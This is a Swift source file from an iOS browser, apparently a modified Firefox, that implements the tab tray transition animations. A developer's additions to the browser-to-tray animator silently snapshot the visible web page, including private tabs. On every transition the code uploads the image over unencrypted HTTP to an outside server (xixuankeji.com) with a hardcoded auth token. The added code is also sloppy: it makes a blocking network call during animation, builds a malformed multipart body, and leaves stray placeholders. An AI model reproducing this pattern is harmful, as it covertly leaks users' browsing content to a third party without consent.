/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */


// jesse
// this code was altered on 20180908? i guess
// it uploads the current browser window pic to the server. 
// the main reason is to support an easy way to log wexin in 
// to be truely useful it needs to grab the camera background and the GL windows
// and it needs to upload a lower res image in the background
// essej


import UIKit
import Shared

class TrayToBrowserAnimator: NSObject, UIViewControllerAnimatedTransitioning {
    func animateTransition(using transitionContext: UIViewControllerContextTransitioning) {
        if let bvc = transitionContext.viewController(forKey: UITransitionContextViewControllerKey.to) as? BrowserViewController,
           let tabTray = transitionContext.viewController(forKey: UITransitionContextViewControllerKey.from) as? TabTrayController {
            transitionFromTray(tabTray, toBrowser: bvc, usingContext: transitionContext)
        }
    }

    func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -> TimeInterval {
        return 1.4
    }
}

private extension TrayToBrowserAnimator {
    func transitionFromTray(_ tabTray: TabTrayController, toBrowser bvc: BrowserViewController, usingContext transitionContext: UIViewControllerContextTransitioning) {
        let container = transitionContext.containerView
        guard let selectedTab = bvc.tabManager.selectedTab else { return }

        let tabManager = bvc.tabManager
        let displayedTabs = selectedTab.isPrivate ? tabManager.privateTabs : tabManager.normalTabs
        guard let expandFromIndex = displayedTabs.index(of: selectedTab) else { return }

        bvc.view.frame = transitionContext.finalFrame(for: bvc)

        // Hide browser components
        bvc.toggleSnackBarVisibility(show: false)
        toggleWebViewVisibility(false, usingTabManager: bvc.tabManager)
        bvc.homePanelController?.view.isHidden = true
        bvc.webViewContainerBackdrop.isHidden = true
        if let url = selectedTab.url, !url.isReaderModeURL {
            bvc.hideReaderModeBar(animated: false)
        }

        // Take a snapshot of the collection view that we can scale/fade out. We don't need to wait for screen updates since it's already rendered on the screen
        let tabCollectionViewSnapshot = tabTray.collectionView.snapshotView(afterScreenUpdates: false)!
        tabTray.collectionView.alpha = 0
        tabCollectionViewSnapshot.frame = tabTray.collectionView.frame
        container.insertSubview(tabCollectionViewSnapshot, at: 0)

        // Create a fake cell to use for the upscaling animation
        let startingFrame = calculateCollapsedCellFrameUsingCollectionView(tabTray.collectionView, atIndex: expandFromIndex)
        let cell = createTransitionCellFromTab(bvc.tabManager.selectedTab, withFrame: startingFrame)
        cell.backgroundHolder.layer.cornerRadius = 0

        container.insertSubview(bvc.view, aboveSubview: tabCollectionViewSnapshot)
        container.insertSubview(cell, aboveSubview: bvc.view)

        // Flush any pending layout/animation code in preperation of the animation call
        container.layoutIfNeeded()

        let finalFrame = calculateExpandedCellFrameFromBVC(bvc)
        bvc.footer.alpha = shouldDisplayFooterForBVC(bvc) ? 1 : 0
        bvc.urlBar.isTransitioning = true

        // Re-calculate the starting transforms for header/footer views in case we switch orientation
        resetTransformsForViews([bvc.header, bvc.headerBackdrop, bvc.readerModeBar, bvc.footer, bvc.footerBackdrop])
        transformHeaderFooterForBVC(bvc, toFrame: startingFrame, container: container)

        UIView.animate(withDuration: self.transitionDuration(using: transitionContext),
            delay: 0, usingSpringWithDamping: 19,
            initialSpringVelocity: 0,
            options: UIViewAnimationOptions(),
            animations: {
            // Scale up the cell and reset the transforms for the header/footers
            cell.frame = finalFrame
            container.layoutIfNeeded()
            cell.title.transform = CGAffineTransform(translationX: 0, y: -cell.title.frame.height)

            bvc.tabTrayDidDismiss(tabTray)
            tabTray.toolbar.transform = CGAffineTransform(translationX: 0, y: UIConstants.ToolbarHeight)
            tabCollectionViewSnapshot.transform = CGAffineTransform(scaleX: 0.9, y: 0.9)
            tabCollectionViewSnapshot.alpha = 0.5
        }, completion: { finished in
            // Remove any of the views we used for the animation
            cell.removeFromSuperview()
            tabCollectionViewSnapshot.removeFromSuperview()
            bvc.footer.alpha = 0.5
            bvc.toggleSnackBarVisibility(show: true)
            toggleWebViewVisibility(true, usingTabManager: bvc.tabManager)
            bvc.webViewContainerBackdrop.isHidden = false // jesse   this is the webview
            bvc.homePanelController?.view.isHidden = false // jesse  this is title bar
            bvc.urlBar.isTransitioning = false
            transitionContext.completeTransition(true)
        })
    }
}

class BrowserToTrayAnimator: NSObject, UIViewControllerAnimatedTransitioning {
    func animateTransition(using transitionContext: UIViewControllerContextTransitioning) {
        if let bvc = transitionContext.viewController(forKey: UITransitionContextViewControllerKey.from) as? BrowserViewController,
           let tabTray = transitionContext.viewController(forKey: UITransitionContextViewControllerKey.to) as? TabTrayController {
			
			//let vwImage = takeSnapshotOfView(view: bvc.webViewContainer)
			let theresponse = takeSnapshotOfView(view: bvc.webViewContainer)
			
			//let data=UIImagePNGRepresentation(vwImage!);

			transitionFromBrowser(bvc, toTabTray: tabTray, usingContext: transitionContext)


        }
    }

    func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -> TimeInterval {
		return 1.1 //jesse
    }
	
	
	 var response: URLResponse?
	
	//https://stackoverflow.com/questions/17145049/capture-uiview-and-save-as-image
	func takeSnapshotOfView(view:UIView) -> URLResponse? {
	//func takeSnapshotOfView(view:UIView) -> UIImage? {
        UIGraphicsBeginImageContext(CGSize(width: view.frame.size.width, height: view.frame.size.height))
        view.drawHierarchy(in: CGRect(x: 0.0, y: 0.0, width: view.frame.size.width, height: view.frame.size.height), afterScreenUpdates: true)
        let image = UIGraphicsGetImageFromCurrentImageContext()
        UIGraphicsEndImageContext()
		
		/*
		 $query->param("screen");  
my $email_address = $query->param("email_address");  
$readsession = $query->param('AUTH');
		*/
		
    var imageData = UIImagePNGRepresentation(image!)

    if imageData != nil{
        var request = NSMutableURLRequest(url: NSURL(string:"http://xixuankeji.com/u/screen2now.es")! as URL)
        var session = URLSession.shared

        request.httpMethod = "POST"

        var boundary = NSString(format: "---------------------------14737809831466499882746641449")
        var contentType = NSString(format: "multipart/form-data; boundary=%@",boundary)
      //  println("Content Type \(contentType)")
        request.addValue(contentType as String, forHTTPHeaderField: "Content-Type")

        var body = NSMutableData()

        // Title
		body.append(NSString(format: "\r\n--%@\r\n",boundary).data(using: String.Encoding.utf8.rawValue)!)
        body.append(NSString(format:"Content-Disposition: form-data; name=\"AUTH\"\r\n\r\n").data(using: String.Encoding.utf8.rawValue)!)
        body.append("p[f].world".data(using: String.Encoding.utf8, allowLossyConversion: true)!)

        // Image
        body.append(NSString(format: "\r\n--%@\r\n", boundary).data(using: String.Encoding.utf8.rawValue)!)
        body.append(NSString(format:"Content-Disposition: form-data; name=\"screen\"; filename=\"screen\"\\r\n").data(using: String.Encoding.utf8.rawValue)!)
        body.append(NSString(format: "Content-Type: application/octet-stream\r\n\r\n").data(using: String.Encoding.utf8.rawValue)!)
		body.append(imageData!)
        body.append(NSString(format: "\r\n--%@\r\n", boundary).data(using: String.Encoding.utf8.rawValue)!)



        request.httpBody = body as Data
  var Status:Bool = false
  
 //let returnData = NSURLConnection.sendSynchronousRequest(request as URLRequest, returning: nil)


_ = (try? NSURLConnection.sendSynchronousRequest(request as URLRequest, returning: &response)) as NSData?


      //  var returnString = NSString(data: returnData!, encoding: NSUTF8StringEncoding)

        //println("returnString \(returnString)")
//return false;
    }

return response;
}


	
}

private extension BrowserToTrayAnimator {
    func transitionFromBrowser(_ bvc: BrowserViewController, toTabTray tabTray: TabTrayController, usingContext transitionContext: UIViewControllerContextTransitioning) {

        let container = transitionContext.containerView
        guard let selectedTab = bvc.tabManager.selectedTab else { return }

        let tabManager = bvc.tabManager
        let displayedTabs = selectedTab.isPrivate ? tabManager.privateTabs : tabManager.normalTabs
        guard let scrollToIndex = displayedTabs.index(of: selectedTab) else { return }

        tabTray.view.frame = transitionContext.finalFrame(for: tabTray)

        // Insert tab tray below the browser and force a layout so the collection view can get it's frame right
        container.insertSubview(tabTray.view, belowSubview: bvc.view)

        // Force subview layout on the collection view so we can calculate the correct end frame for the animation
        tabTray.view.layoutSubviews()

        tabTray.collectionView.scrollToItem(at: IndexPath(item: scrollToIndex, section: 0), at: .centeredVertically, animated: false) //jesse

        // Build a tab cell that we will use to animate the scaling of the browser to the tab
        let expandedFrame = calculateExpandedCellFrameFromBVC(bvc)
        let cell = createTransitionCellFromTab(bvc.tabManager.selectedTab, withFrame: expandedFrame)
        cell.backgroundHolder.layer.cornerRadius = TabTrayControllerUX.CornerRadius
        cell.innerStroke.isHidden = true

        // Take a snapshot of the collection view to perform the scaling/alpha effect
        ////let tabCollectionViewSnapshot = tabTray.collectionView.snapshotView(afterScreenUpdates: true)!
		let tabWorldViewSnapshot = bvc.view.snapshotView(afterScreenUpdates: false)!
		let tabCollectionViewSnapshot = bvc.view.snapshotView(afterScreenUpdates: false)!
		//tabWorldViewSnapshot.provideImageData(<#T##data: UnsafeMutableRawPointer##UnsafeMutableRawPointer#>, bytesPerRow: <#T##Int#>, origin: <#T##Int#>, <#T##y: Int##Int#>, size: <#T##Int#>, <#T##height: Int##Int#>, userInfo: <#T##Any?#>)
		
        tabCollectionViewSnapshot.frame = tabTray.collectionView.frame
        tabCollectionViewSnapshot.transform = CGAffineTransform(scaleX: 0.3, y: 0.9)
        tabCollectionViewSnapshot.alpha = 0.5 // ?? note sure. maybe the other screencaps are faded out and we see the camera BG. we can fade them in later
        tabTray.view.insertSubview(tabCollectionViewSnapshot, belowSubview: tabTray.toolbar)

        if let toast = bvc.clipboardBarDisplayHandler.clipboardToast {
            toast.removeFromSuperview()
        }
        
        container.addSubview(cell)
        cell.layoutIfNeeded()
        cell.title.transform = CGAffineTransform(translationX: 0, y: -cell.title.frame.size.height)

        // Hide views we don't want to show during the animation in the BVC
        bvc.homePanelController?.view.isHidden = true
        bvc.toggleSnackBarVisibility(show: false)
        toggleWebViewVisibility(false, usingTabManager: bvc.tabManager)
        bvc.urlBar.isTransitioning = true

        // Since we are hiding the collection view and the snapshot API takes the snapshot after the next screen update,
        // the screenshot ends up being blank unless we set the collection view hidden after the screen update happens. 
        // To work around this, we dispatch the setting of collection view to hidden after the screen update is completed.
        DispatchQueue.main.async {
            tabTray.collectionView.isHidden = true
            let finalFrame = calculateCollapsedCellFrameUsingCollectionView(tabTray.collectionView,
                atIndex: scrollToIndex)
            tabTray.toolbar.transform = CGAffineTransform(translationX: 0, y: UIConstants.ToolbarHeight)

            UIView.animate(withDuration: self.transitionDuration(using: transitionContext),
                delay: 0, usingSpringWithDamping: 1,
                initialSpringVelocity: 0,
                options: UIViewAnimationOptions(),
                animations: {
                cell.frame = finalFrame
                cell.title.transform = CGAffineTransform.identity
                cell.layoutIfNeeded()

                transformHeaderFooterForBVC(bvc, toFrame: finalFrame, container: container)

                bvc.urlBar.updateAlphaForSubviews(0)
                bvc.footer.alpha = 0
                tabCollectionViewSnapshot.alpha = 1

                tabTray.toolbar.transform = CGAffineTransform.identity
                resetTransformsForViews([tabCollectionViewSnapshot])
            }, completion: { finished in
                // Remove any of the views we used for the animation
                cell.removeFromSuperview()
                tabCollectionViewSnapshot.removeFromSuperview()
                tabTray.collectionView.isHidden = false

                bvc.toggleSnackBarVisibility(show: true)
                toggleWebViewVisibility(true, usingTabManager: bvc.tabManager)
                bvc.homePanelController?.view.isHidden = true // jesse: o false

                bvc.urlBar.isTransitioning = false
                transitionContext.completeTransition(true)
            })
        }
    }
}

private func transformHeaderFooterForBVC(_ bvc: BrowserViewController, toFrame finalFrame: CGRect, container: UIView) {
    let footerForTransform = footerTransform(bvc.footer.frame, toFrame: finalFrame, container: container)
    let headerForTransform = headerTransform(bvc.header.frame, toFrame: finalFrame, container: container)

    bvc.footer.transform = footerForTransform
    bvc.footerBackdrop.transform = footerForTransform
    bvc.header.transform = headerForTransform
    bvc.readerModeBar?.transform = headerForTransform
    bvc.headerBackdrop.transform = headerForTransform
}

private func footerTransform( _ frame: CGRect, toFrame finalFrame: CGRect, container: UIView) -> CGAffineTransform {
    let frame = container.convert(frame, to: container)
    let endY = finalFrame.maxY - (frame.size.height / 2)
    let endX = finalFrame.midX
    let translation = CGPoint(x: endX - frame.midX, y: endY - frame.midY)

    let scaleX = finalFrame.width / frame.width

    var transform = CGAffineTransform.identity
    transform = transform.translatedBy(x: translation.x, y: translation.y)
    transform = transform.scaledBy(x: scaleX, y: scaleX)
    return transform
}

private func headerTransform(_ frame: CGRect, toFrame finalFrame: CGRect, container: UIView) -> CGAffineTransform {
    let frame = container.convert(frame, to: container)
    let endY = finalFrame.minY + (frame.size.height / 2)
    let endX = finalFrame.midX
    let translation = CGPoint(x: endX - frame.midX, y: endY - frame.midY)

    let scaleX = finalFrame.width / frame.width

    var transform = CGAffineTransform.identity
    transform = transform.translatedBy(x: translation.x, y: translation.y)
    transform = transform.scaledBy(x: scaleX, y: scaleX)
    return transform
}

//MARK: Private Helper Methods
private func calculateCollapsedCellFrameUsingCollectionView(_ collectionView: UICollectionView, atIndex index: Int) -> CGRect {
    if let attr = collectionView.collectionViewLayout.layoutAttributesForItem(at: IndexPath(item: index, section: 0)) {
        return collectionView.convert(attr.frame, to: collectionView.superview)
    } else {
        return CGRect.zero
    }
}

private func calculateExpandedCellFrameFromBVC(_ bvc: BrowserViewController) -> CGRect {
    var frame = bvc.webViewContainer.frame

    // If we're navigating to a home panel and we were expecting to show the toolbar, add more height to end frame since
    // there is no toolbar for home panels
    if !bvc.shouldShowFooterForTraitCollection(bvc.traitCollection) {
        return frame
    } else if let url = bvc.tabManager.selectedTab?.url, url.isAboutURL && bvc.toolbar == nil {
        frame.size.height += UIConstants.ToolbarHeight
    }

    return frame
}

private func shouldDisplayFooterForBVC(_ bvc: BrowserViewController) -> Bool {
    if bvc.shouldShowFooterForTraitCollection(bvc.traitCollection) {
        if let url = bvc.tabManager.selectedTab?.url {
            return !url.isAboutURL
        }
    }
    return false
}

private func toggleWebViewVisibility(_ show: Bool, usingTabManager tabManager: TabManager) {
    for i in 0..<tabManager.count {
        if let tab = tabManager[i] {
            tab.webView?.isHidden = !show
        }
    }
}

private func resetTransformsForViews(_ views: [UIView?]) {
    for view in views {
        // Reset back to origin
        view?.transform = CGAffineTransform.identity
    }
}

private func transformToolbarsToFrame(_ toolbars: [UIView?], toRect endRect: CGRect) {
    for toolbar in toolbars {
        // Reset back to origin
        toolbar?.transform = CGAffineTransform.identity

        // Transform from origin to where we want them to end up
        if let toolbarFrame = toolbar?.frame {
            toolbar?.transform = CGAffineTransformMakeRectToRect(toolbarFrame, toFrame: endRect)
        }
    }
}

private func createTransitionCellFromTab(_ tab: Tab?, withFrame frame: CGRect) -> TabCell {
    let cell = TabCell(frame: frame)
    cell.background.image = tab?.screenshot
    cell.titleText.text = tab?.displayTitle

    if let tab = tab, tab.isPrivate {
        cell.style = .dark
    }

    if let favIcon = tab?.displayFavicon {
        cell.favicon.sd_setImage(with: URL(string: favIcon.url)!)
    } else {
        var defaultFavicon = UIImage(named: "defaultFavicon")
        if tab?.isPrivate ?? false {
            defaultFavicon = defaultFavicon?.withRenderingMode(.alwaysTemplate)
            cell.favicon.image = defaultFavicon
            cell.favicon.tintColor = (tab?.isPrivate ?? false) ? UIColor.white : UIColor.darkGray
        } else {
            cell.favicon.image = defaultFavicon
        }
    }
    return cell
}
